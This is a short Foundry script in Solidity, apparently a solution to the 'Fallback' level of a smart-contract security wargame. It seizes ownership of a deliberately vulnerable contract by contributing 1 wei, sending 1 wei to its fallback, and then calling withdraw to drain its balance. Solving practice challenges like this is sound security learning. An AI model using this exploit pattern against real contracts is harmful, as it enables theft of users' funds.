// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

import "forge-std/Script.sol";
import "@contracts/Level01.sol";

contract Level1Script is Script {
    Fallback level1 = Fallback(0x8cd3815573E3AB0291581973aEdCEc758F0C9278);

    function run() public {
        vm.startBroadcast();

        level1.contribute{value: 1 wei}();
        level1.getContribution();

        (bool sent, ) = address(level1).call{value: 1 wei}("");
        require(sent, "couldn't transfer wei to the contract");
        level1.owner();
        level1.getContribution();

        level1.withdraw();

        vm.stopBroadcast();
    }
}
